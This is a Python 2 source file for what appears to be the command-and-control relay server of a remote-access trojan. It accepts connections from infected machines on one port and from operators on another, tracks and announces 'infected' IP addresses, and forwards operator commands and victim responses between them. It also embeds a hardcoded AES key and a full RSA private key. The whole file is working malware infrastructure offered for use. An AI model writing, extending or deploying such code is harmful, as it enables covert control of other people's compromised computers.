import socket
import sys
from StringIO import StringIO
import threading, time
from packet import Packet
from Queue import Queue,Empty
import errno

class RelayServer:
    def __init__(self):
        self.toClient = {}
        self.toVirus = {}

        self.AESKey = '\x40\x73\x8A\xC7\x8F\x0F\xD5\xEF\x02\x57\xB2\xE1\x9B\x83\x04\x15'
        self.RSAPrivateKey = '-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAonQkIgH5+WBaEGAfqH6JGW3M7vYwPCHz9tmz1ToH82YVDBaX\n9qNUxJRs3t5QNrvgNo9Dfem6nnXpgIdSykheO1EB2CVJ2Z92bewBmYu8Pda3BOUR\nq0mi1gsn5fna3JVyQkB/gElSld0elQ5BubKn6wCh3tCWj8FS66DY8U9f6aeRMN1Q\nBPPprd1zsbixafeLg5Cc+utIXCtRTZDeCL2d7pccI276OC2r7GHwMUAsFqdYpva2\nW4PmC+AHe9eZk9FknCc/pXD8AdeUccDAZ7wRo/VFqbKCQR6Ei6ooUFXGEXdJU9tE\nuxPYb+CM1uGjEyqvuDGvUJS+fbOtMhM1L/kSKwIDAQABAoIBAEEdpoIPIsCHk3Iu\n5WGnXpLXxSYffhQMU/qlJoUYXql8SIFw6PaOX2LwT3dByws1YVjdMeNddVUg1DiV\nhWTZfxPtk3ys7Z4SYekLiVSfgxOSZgfLPbrXqDJ9hD+VV9nE+Wh+69xjB3xUhnae\noU+qwc3bkgZ6u27hwbf64BpRg5Nm2LgGVOvaJmbSCR5/llR7bWYPBqChmRKG9cah\nLPhBxuRJoj+C7MU0zFLWi441p3w1OnrpjTJSreb0vqAzWSn1/DjigUUYKq4ifgoJ\nnjx+ymNKP7XOK+/+TKqJw0MXoYRhdxbQiWV4/yATSs0PR8hWbFOcsG5su/JhSR8A\nZYmEKpECgYEAyb4SKdHMonK6lfkXux6lv1sBqltxx5hLYlm8Glsmn8pu8bUrDk+y\nFPEgVkeQrB462wcjBTbUm20+saiUMR+RwJ3KNbU/qSt/GTXTl1KbUePdb1/ccczk\nLZ1njhy+KrtIYXXOpXbzn6SbIiGhQkE9zXYc1Jdm+5HaxRYyMY6n8jMCgYEAziUL\neoi5+OD81yXMfIQUI9UYY5+UYixfohrVFwGT1/LcIyFLh6WdUquW6HFtGSOZL5KX\nq2AS720ql69IqD52clAtmNj+mfItNd8WBRyGPO2ldMaxyPDyPzjOx/UOt81517xz\neOYPZUVgRDNnaOcSGEGzhIPcRvCrQTKokuCnmCkCgYAWaPa7joKcyQHRBwqLzqu6\nxfE5a08ITPKSykUK6HUx6trIHsfZnyC5Es/0xZ5cgD8pdXF+csjLOydrtL5BdrBK\nJT0BGlEoCZzkwAXxGUwHnLhMVum1+nyeVI3cS3UUahlwOhXqa3xEj5RsBjBTm8ux\ntx0cwHTAHUOgAQcyWhZt4QKBgB+eRvhwaDXoLF/DiG3AxGYKlUcSfuvf6nsuqmhw\n8YA529H3lWIk4NCBSRA19YnZj/FgBqtefQkEMXg6hmZnzjsSWSwMfGCYaJ7OrM3z\n5hMKUEps/2/WpRFVYUICMFO4zGtumDd+8fWSgoVzbPUGHBxkV2iH4Q1wdJP3dSuy\nEYKhAoGAKyPQQcKZeBhfoAhBXY+caMUlXEsYjqqbYCDJaCuK8n72u3hxDMlrSWjD\nHBjGPo0fXB5nQC2S1U7V0qS4C7Wc8tK0V0BddvHka/uSpm4ZkQIhiVt78oKem3Gv\nJUE68gUDONxhyQsBpfI93Kfl2lD7TsKh5SlZxxvgLDwZJDck/Qo=\n-----END RSA PRIVATE KEY-----'

    def runVirus(self):
        host = '0.0.0.0'
        port = 5715 
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onVirusConnect(client,address)

    def runClient(self):
        host = '0.0.0.0'
        port = 5720
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onClientConnect(client,address)

    def run(self):
        threading.Thread(target=self.runClient).start()
        threading.Thread(target=self.runVirus).start()


    def sendIPList(self,address=""):
        state = "100"
        ips = self.toVirus.keys()
        data = ""
        for ip in ips:
            data += ip + ":" + self.toVirus[ip][2]
        length = len(data)

        pkt = Packet()
        pkt.state = state
        pkt.length = str(length)
        pkt.data = data
        pkt.encryptData(self.AESKey)
        print "IPList: " + data
        if address != "":
            pkt.returnIP = address[0]
            self.enqueueToClient(pkt)
        else:
            for ip in self.toClient.keys():
                self.enqueueToClient(pkt,ip)

    def onVirusConnect(self,client,address):
        print address[0] + " infected!"
        q = Queue()
        self.toVirus[address[0]] = (client,q,None)
        t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
        t.start()
        threading.Thread(target=self.dequeue,args=[q,client,t]).start()

    def receiveFromVirus(self,s,address):
        while True:
            pkt = Packet()
            try:
                pkt.construct(s)
            except socket.error as error:
                if error.errno == 10054 or error.errno == 104:
                    del self.toVirus[address[0]]
                    self.sendIPList()
                    print address[0] + " uninfected or turned computer off!"
                    break
                else:
                    raise
            if pkt.state == '100':
                tup = self.toVirus[address[0]]
                pkt.RSADecryptData(self.RSAPrivateKey)
                self.toVirus[address[0]] = (tup[0],tup[1],pkt.data)
                self.sendIPList()
            else: self.enqueueToClient(pkt)


    def onClientConnect(self,client,address):
        print address[0] + " connected!"
        q = Queue()
        self.toClient[address[0]] = (client,q)
        self.sendIPList(address)
        t = threading.Thread(target=self.receiveFromClient,args=[client,address])
        t.start()
        threading.Thread(target=self.dequeue,args=[q,client,t]).start()

    def receiveFromClient(self,s,address):
        while True:
            pkt = Packet()
            try:
                pkt.construct(s)
            except socket.error as error:
                if error.errno == 10054 or error.errno == 104:
                    del self.toClient[address[0]]
                    print address[0] + " closed client!"
                    break
                else:
                    raise
            pkt.returnIP = address[0]
            self.enqueueToVirus(pkt)

    def enqueueToClient(self,pkt,address=""):
        if address == "":
            q = self.toClient[pkt.returnIP][1]
        else:
            q = self.toClient[address][1]
        q.put(pkt)

    def enqueueToVirus(self,pkt):
        q = self.toVirus[pkt.toIP][1]
        q.put(pkt)

    def dequeue(self,q,s,t):
        while t.isAlive():
            try:
                pkt = q.get(block=True,timeout=20)
                pkt.send(s)
            except Empty:
                pass

def main():
    r = RelayServer()
    r.run()

if __name__ == '__main__':
    main()
